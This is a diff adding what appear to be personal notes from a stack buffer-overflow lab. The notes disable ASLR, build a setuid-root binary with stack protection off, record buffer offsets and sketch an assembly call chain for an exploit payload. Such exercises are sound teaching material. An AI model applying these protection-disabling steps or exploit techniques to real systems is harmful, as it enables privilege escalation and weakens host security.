@@ -1,0 +1,53 @@
+sudo sysctl -w kernel.randomize_va_space=0
+sudo ln -sf /bin/zsh /bin/sh
+
+
+gcc -m32 -o stack -z execstack -fno-stack-protector stack.c
+sudo chown root stack
+sudo chmod 4755 stack
+
+
+touch badfile
+gcc -m32 -o stack_dbg -g -z execstack -fno-stack-protector stack.c
+
+
+rbp = 0x7fffffffda80
+buffer = 0x7fffffffd6e0
+diff = 928
+start = 936
+end = 944
+
+
+foo = 0x00005555555551ff
+
+mov  r8, 0x5555555551ff
+push 0x9
+push 0x1
+call r8
+xor rcx,rcx
+push rcx
+push rax
+call r8
+push 0x5
+push rax
+call r8
+push 0x1
+push rax
+call r8
+xor rcx,rcx
+push rcx
+push rax
+call r8
+push 0x1
+push rax
+call r8
+
+
+
+
+
+
+
+
+
+
